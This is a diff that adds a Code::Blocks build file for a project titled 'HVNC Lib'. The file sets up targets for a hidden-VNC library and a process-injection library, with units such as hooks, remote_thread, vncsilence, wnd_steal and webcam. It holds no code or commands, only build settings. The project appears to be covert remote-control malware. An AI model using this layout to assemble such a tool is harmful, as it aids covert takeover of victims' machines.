@@ -1,0 +1,328 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="HVNC Lib" />
+		<Option pch_mode="2" />
+		<Option default_target="HVNC Release" />
+		<Option compiler="msvc8" />
+		<Build>
+			<Target title="HVNC Debug">
+				<Option output="..\..\bin\Debug\hvnc" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="..\..\obj\Debug\hvnc\" />
+				<Option type="2" />
+				<Option compiler="msvc8" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Od" />
+					<Add option="/D_DEBUG" />
+				</Compiler>
+			</Target>
+			<Target title="HVNC Release">
+				<Option output="..\..\bin\Release\hvnc" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="..\..\obj\Release\hvnc\" />
+				<Option type="2" />
+				<Option compiler="msvc8" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/DNDEBUG" />
+					<Add directory="..\..\..\ntdll" />
+				</Compiler>
+			</Target>
+			<Target title="HVNC InjLib x86 Debug">
+				<Option output="..\..\bin\Debug\hvncinj x86" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="..\..\obj\Debug\injlib x86\" />
+				<Option type="2" />
+				<Option compiler="msvc8" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Od" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_INJLIB" />
+				</Compiler>
+			</Target>
+			<Target title="HVNC InjLib x86 Release">
+				<Option output="..\..\bin\Release\hvncinj x86" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="..\..\obj\Release\injlib x86\" />
+				<Option type="2" />
+				<Option compiler="msvc8" />
+				<Compiler>
+					<Add option="/arch:SSE" />
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_INJLIB" />
+					<Add directory="..\..\..\ntdll" />
+				</Compiler>
+			</Target>
+			<Target title="HVNC InjLib x64 Debug">
+				<Option output="..\..\bin\Debug\hvncinj x64" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="..\..\obj\Debug\injlib x64\" />
+				<Option type="2" />
+				<Option compiler="msvc8" />
+				<Compiler>
+					<Add option="/Od" />
+					<Add option="/D_DEBUG" />
+					<Add option="/D_INJLIB" />
+				</Compiler>
+			</Target>
+			<Target title="HVNC InjLib x64 Release">
+				<Option output="..\..\bin\Release\hvncinj x64" prefix_auto="1" extension_auto="1" />
+				<Option working_dir="" />
+				<Option object_output="..\..\obj\Release\injlib x64\" />
+				<Option type="2" />
+				<Option compiler="msvc8" />
+				<Compiler>
+					<Add option="/Oy" />
+					<Add option="/Os" />
+					<Add option="/Ox" />
+					<Add option="/favor:AMD64" />
+					<Add option="/DNDEBUG" />
+					<Add option="/D_INJLIB" />
+				</Compiler>
+			</Target>
+		</Build>
+		<VirtualTargets>
+			<Add alias="Debug" targets="HVNC Debug;HVNC InjLib x86 Debug;HVNC InjLib x64 Debug;" />
+			<Add alias="Debug x86" targets="HVNC Debug;HVNC InjLib x86 Debug;" />
+			<Add alias="Release" targets="HVNC Release;HVNC InjLib x86 Release;HVNC InjLib x64 Release;" />
+			<Add alias="Release x86" targets="HVNC Release;HVNC InjLib x86 Release;" />
+		</VirtualTargets>
+		<Compiler>
+			<Add option="/GA" />
+			<Add option="/Gy" />
+			<Add option="/W3" />
+			<Add option="/Zi" />
+			<Add option="/GS-" />
+			<Add option="/Zp16" />
+			<Add option="/Ob1" />
+			<Add option="/DUNICODE" />
+			<Add option="/D_UNICODE" />
+			<Add option="/D_HVNC" />
+			<Add directory="..\libs" />
+			<Add directory="..\libs\zlib" />
+			<Add directory="..\libs\include" />
+			<Add directory="..\..\libs" />
+			<Add directory="..\zlib" />
+			<Add directory="..\include" />
+		</Compiler>
+		<Linker>
+			<Add option="/DEBUG" />
+		</Linker>
+		<Unit filename="HVNC.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="defines.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="includes.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="injlib\hidevncprocwnd.cpp">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\hidevncprocwnd.h">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\hooks.cpp">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\hooks.h">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\injlib.cpp">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\injlib.h">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\ntsystem.h">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\remote_thread.cpp">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\vncclipboard.cpp">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\vncclipboard.h">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\vncmsg.cpp">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\vncmsg.h">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\vncsilence.cpp">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="injlib\vncsilence.h">
+			<Option target="HVNC InjLib x86 Debug" />
+			<Option target="HVNC InjLib x86 Release" />
+			<Option target="HVNC InjLib x64 Debug" />
+			<Option target="HVNC InjLib x64 Release" />
+		</Unit>
+		<Unit filename="vnc\LayoutSwitcher.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\LayoutSwitcher.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\TaskSwitcher.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\TaskSwitcher.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\cpu_limit.cpp" />
+		<Unit filename="vnc\cpu_limit.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\cursor.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\cursor.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\dib.cpp" />
+		<Unit filename="vnc\dib.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\events.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\events.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\kbd.cpp" />
+		<Unit filename="vnc\kbd.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\mou.cpp" />
+		<Unit filename="vnc\mou.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\sshot.cpp" />
+		<Unit filename="vnc\sshot.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\vnc.cpp" />
+		<Unit filename="vnc\vnc.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\vnc_func.cpp" />
+		<Unit filename="vnc\vnc_func.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\windows.cpp" />
+		<Unit filename="vnc\windows.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\wnd_steal.cpp" />
+		<Unit filename="vnc\wnd_steal.h" />
+		<Unit filename="vnc\wnd_watcher.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\wnd_watcher.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="vnc\xvnc.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="webcam.cpp">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Unit filename="webcam.h">
+			<Option target="HVNC Debug" />
+			<Option target="HVNC Release" />
+		</Unit>
+		<Extensions>
+			<code_completion>
+				<search_path add="..\..\..\ntdll" />
+			</code_completion>
+			<envvars />
+			<debugger />
+			<DoxyBlocks>
+				<comment_style block="0" line="0" />
+				<doxyfile_project />
+				<doxyfile_build />
+				<doxyfile_warnings />
+				<doxyfile_output />
+				<doxyfile_dot />
+				<general />
+			</DoxyBlocks>
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
